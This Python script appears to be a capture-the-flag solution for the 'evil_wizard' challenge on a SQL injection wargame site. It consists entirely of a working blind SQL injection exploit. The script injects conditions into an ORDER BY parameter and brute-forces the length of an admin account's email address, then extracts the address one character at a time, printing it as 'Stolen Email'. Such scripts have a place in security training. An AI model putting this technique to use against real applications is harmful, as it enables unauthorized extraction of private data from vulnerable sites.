#!/usr/bin/py
#-*-coding:utf-8 -*-

import requests

def GetEmailLength(t, s):
  MIN_LENGTH = 1
  MAX_LENGTH = 100
  i = MIN_LENGTH

  while i <= MAX_LENGTH:
    try:
      tmpEmailLength = str(i)
      payload = t + "?order=id='admin' and length(email)=" + tmpEmailLength + " desc limit 1"
      r = requests.post(payload, cookies=(dict(PHPSESSID=s)))
      #print(payload)

    except OSError as e:
      continue

    except Exception as e:
      print("GetEmailLength() Error...")
      print(e)
      exit(1)

    if ">admin<" in r.text:
      return i
    
    i += 1

def GetEmail(t, s, lengthEmail):
  FIRST_ASCII = 32
  LAST_ASCII = 127
  BACK_SLASH = 92
  tmpEmail = ""

  for i in range(1, lengthEmail + 1):
    j = FIRST_ASCII
    while j <= LAST_ASCII:
      try:
        # backslash error bypass
        if j == BACK_SLASH:
          j += 1
        
        tmpChar = chr(j)
        payload = t + "?order=id='admin' and substr(email, " + str(i) + ", 1)=binary(\'" + tmpChar +"\') desc limit 1"
        r = requests.post(payload, cookies=(dict(PHPSESSID=s)))
        #print(payload)

      # Caused by NewConnectionError('<urllib3.connection.VerifiedHTTPSConnection object at 0x7f9f58e66910>: Failed to establish a new connection: [Errno 110] Connection timed out'))
      except OSError as e:
        continue

      except Exception as e:
        print("GetEmail Error...")
        print(e)
        exit(1)

      # ascii code 0d95 "_" => "Hack" bypass
      if ">admin<" in r.text:
        tmpEmail += chr(j)
        print("Stolen Email : %s" %(tmpEmail))
        break

      j += 1
      
  return tmpEmail

if __name__ == "__main__":
  t = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
  session = "" # Session
  email = ""

  lengthEmail = GetEmailLength(t, session)
  print("Length of Email : %d\n" %(lengthEmail))

  email = GetEmail(t, session, lengthEmail)
  print("Final Email : %s" %(email))